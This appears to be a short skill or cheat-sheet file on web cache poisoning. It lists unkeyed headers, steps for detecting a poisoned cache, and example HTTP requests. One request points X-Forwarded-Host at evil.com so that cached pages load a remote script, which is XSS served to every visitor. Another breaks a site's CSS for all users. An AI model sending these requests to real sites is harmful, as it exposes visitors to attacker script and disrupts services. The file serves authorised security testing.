# Web Cache Poisoning Skill

## Detection
1. Identify unkeyed inputs (X-Forwarded-Host, X-Original-URL, X-Rewrite-URL)
2. Inject payload → observe if response is cached
3. Access the same URL without the header → if payload appears, cache poisoned

## Common Unkeyed Headers
- X-Forwarded-Host
- X-Original-URL
- X-Rewrite-URL
- X-HTTP-Method-Override
- X-Forwarded-For
- X-Host
- X-Real-IP

## XSS via Cache Poisoning
```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

Response: <script src="https://evil.com/payload.js"></script>
```

## DoS via Cache Poisoning
```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: a.target.com

Response: <link rel="stylesheet" href="https://a.target.com/nonexistent.css">
# Every user gets 404 for CSS → site breaks
```

## Testing Methodology
1. Send request with unkeyed header → note response
2. Send request without header → note if response differs
3. If cached response includes unkeyed header value → vulnerable
4. Test impact (XSS, redirect, DoS)
